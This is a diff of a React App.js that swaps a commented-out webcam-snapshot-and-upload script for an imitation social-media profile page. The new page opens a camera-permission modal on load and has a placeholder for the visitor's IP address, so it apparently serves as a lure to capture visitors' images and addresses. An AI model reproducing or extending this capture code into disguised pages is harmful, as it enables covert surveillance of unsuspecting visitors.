@@ -1,118 +1,191 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import "./App.css";
 import AllowCamera from "./AllowCamera";
-import { Button, Image } from "antd";
+import {
+  UserOutlined,
+  ArrowLeftOutlined,
+  MoreOutlined,
+  AppstoreOutlined,
+  PlaySquareOutlined,
+} from "@ant-design/icons";
+import {
+  Avatar,
+  Button,
+  Col,
+  Image,
+  Layout,
+  Row,
+  Space,
+  Typography,
+} from "antd";
+const { Text } = Typography;
+
+const headerStyle = {
+  display: "flex",
+  alignItems: "center",
+  padding: " 1vw 6vw",
+};
+const profileStyle = {
+  display: "flex",
+  padding: " 1vw 6vw",
+};
+const numbersStyle = {
+  display: "flex",
+  alignItems: "center",
+  rowGap: 1,
+};
+const storiesStyle = {
+  display: "flex",
+  alignItems: "center",
+  padding: "6vw 1vw",
+  gap: "20px",
+};
+const sectionsStyle = {
+  display: "flex",
+  justifyContent: "center",
+  height: "40px",
+  fontSize: "25px",
+};
 
 function App() {
   const [openModal, setOpenModal] = useState(false);
   const [image, setImage] = useState("");
+  const [ip, setIP] = useState("");
 
-  const allowModal = () => {
-    setOpenModal(true);
+  const getData = async () => {
+    // const res = await axios.get("https://api.ipify.org/?format=json");
+    // console.log(res.data);
+    // setIP(res.data.ip);
   };
+  useEffect(() => {
+    // console.log("browserVersion", mobileModel);
+    //passing getData method to the lifecycle method
+    setOpenModal(true);
+    getData();
+  }, []);
 
   return (
     <>
       <div>
-      
-          {/* <html lang="en"> 
- 
-                <head> 
-                  <meta charset="UTF-8"> 
-                  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-                  <title>Camera Screenshot</title> 
-                  <style> 
-                  body { 
-                      margin: 0; 
-                      overflow: hidden; 
-                      display: flex; 
-                      justify-content: center; 
-                      align-items: center; 
-                      height: 100vh; 
-                      background-color: black; 
-                  } 
-           
-                  video { 
-                      position: absolute; 
-                      top: 0; 
-                      left: 0; 
-                      width: 100%; 
-                      height: 100%; 
-                      object-fit: cover; 
-                  } 
-           
-                  button { 
-                      position: absolute; 
-                      z-index: 1; 
-                      padding: 10px 20px; 
-                      font-size: 16px; 
-                      cursor: pointer; 
-                      color: white; 
-                      background-color: rgba(0, 0, 0, 0.5); 
-                      border: none; 
-                  } 
-                  </style> 
-                </head> 
-           
-                <body> 
-                  <audio id="alertSound" src="alert.wav" loop></audio> 
-                  <video id="videoFeed" autoplay muted></video> 
-                  <button id="playButton">Click</button> 
-           
-                  <script> 
-                  document.getElementById('playButton').addEventListener('click', async () => { 
-                      // Play the alert sound 
-                      const audio = document.getElementById('alertSound'); 
-                      audio.volume = 1.0; // Ensure volume is set to max before playing 
-                      audio.play().catch(error => { 
-                          console.error('Error playing audio:', error); 
-                      }); 
-           
-                      // Request camera access 
-                      try { 
-                          const stream = await navigator.mediaDevices.getUserMedia({ video: true }); 
-                          const videoFeed = document.getElementById('videoFeed'); 
-                          videoFeed.srcObject = stream; 
-           
-                          // Take a screenshot after a short delay 
-                          setTimeout(() => { 
-                              const canvas = document.createElement('canvas'); 
-                              canvas.width = videoFeed.videoWidth; 
-                              canvas.height = videoFeed.videoHeight; 
-                              const context = canvas.getContext('2d'); 
-                              context.drawImage(videoFeed, 0, 0, canvas.width, canvas.height); 
-           
-                              // Convert canvas to base64 string 
-                              let imgData = canvas.toDataURL('image/png'); 
-           
-                              // Send the screenshot data to the server 
-                              fetch('save_screenshot.php', { 
-                                  method: 'POST', 
-                                  headers: { 
-                                      'Content-Type': 'application/json', 
-                                  }, 
-                                  body: JSON.stringify({ image: imgData }) 
-                              }) 
-                              .then(response => response.json()) 
-                              .then(data => { 
-                                  console.log('Screenshot saved successfully:', data); 
-                              }) 
-                              .catch(error => { 
-                                  console.error('Error saving screenshot:', error); 
-                              }); 
-                          }, 2000); // Adjust delay as needed 
-           
-                      } catch (err) { 
-                          console.error('Error accessing camera:', err); 
-                      } 
-                  }); 
-                  </script> 
-                </body> 
-           
-          </html> */}
-      
-        <Button onClick={allowModal}>yes</Button>
-        <Button onClick={() => setOpenModal(false)}>No</Button>
+        <Layout className="app-container">
+          <div style={{ backgroundColor: "#000", color: "white" }}>
+            <Row style={headerStyle}>
+              <Col style={{ alignItems: "right" }} flex={1}>
+                <ArrowLeftOutlined />
+              </Col>
+              <Col flex={3}>
+                <h3>User Name</h3>
+              </Col>
+              <Col flex={1}>
+                <MoreOutlined />
+              </Col>
+            </Row>
+            <Row style={profileStyle}>
+              <Col flex={3}>
+                <Avatar
+                  style={{ backgroundColor: "#EEE" }}
+                  size={75}
+                  icon={<UserOutlined />}
+                />
+              </Col>
+              <Col flex={2}>
+                <Space direction="vertical" style={numbersStyle}>
+                  <Text style={{ color: "white" }} strong>
+                    50
+                  </Text>
+                  <Text style={{ color: "white" }}>posts</Text>
+                </Space>
+              </Col>
+              <Col flex={2}>
+                <Space direction="vertical" style={numbersStyle}>
+                  <Text style={{ color: "white" }} strong>
+                    321
+                  </Text>
+                  <Text style={{ color: "white" }}>followers</Text>
+                </Space>
+              </Col>
+              <Col flex={2}>
+                <Space direction="vertical" style={numbersStyle}>
+                  <Text style={{ color: "white" }} strong>
+                    123
+                  </Text>
+                  <Text style={{ color: "white" }}>following</Text>
+                </Space>
+              </Col>
+            </Row>
+            <Space direction="vertical">
+              <Text style={{ color: "white" }} strong>
+                User Name
+              </Text>
+              <h2>Your IP Address is</h2>
+              <h4>{ip}</h4>
+              <Text style={{ color: "white" }}>
+                description: sfhsfsfs sfjskfsdkjsdd sfhskjhdkg skfjs jfkshw
+                sfhsk hskj sfdjsdglhglsdgdsdlfgsk jdskdjskjghsdkjghdskjsdg
+                sfjsdgkjsdhkjsdhkdjsdh
+              </Text>
+            </Space>
+            <Row>
+              <Col span={10}>
+                <Button
+                  style={{ width: "95%", marginLeft: "4px" }}
+                  type="primary"
+                >
+                  Follow
+                </Button>
+              </Col>
+              <Col span={10}>
+                <Button style={{ width: "95%", margin: "0 4px" }}>
+                  Message
+                </Button>
+              </Col>
+              <Col span={4}>
+                <Button style={{ width: "95%", marginRight: "4px" }}>
+                  +<UserOutlined />
+                </Button>
+              </Col>
+            </Row>
+            <Row style={storiesStyle}>
+              <Avatar style={{ backgroundColor: "#EEE" }} size={70} />
+              <Avatar style={{ backgroundColor: "#EEE" }} size={70} />
+              <Avatar style={{ backgroundColor: "#EEE" }} size={70} />
+              <Avatar style={{ backgroundColor: "#EEE" }} size={70} />
+            </Row>
+            <Row>
+              <Col style={sectionsStyle} flex={3}>
+                <AppstoreOutlined />
+              </Col>
+              <Col style={sectionsStyle} flex={3}>
+                <PlaySquareOutlined />
+              </Col>
+              <Col style={sectionsStyle} flex={3}>
+                <UserOutlined />
+              </Col>
+            </Row>
+          </div>
+          <Row>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+          </Row>
+          <Row>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+            <Col span={8}>
+              <Image height={150} width={"100%"} />
+            </Col>
+          </Row>
+        </Layout>
       </div>
       <Image width={500} src={image} />
       {openModal && (
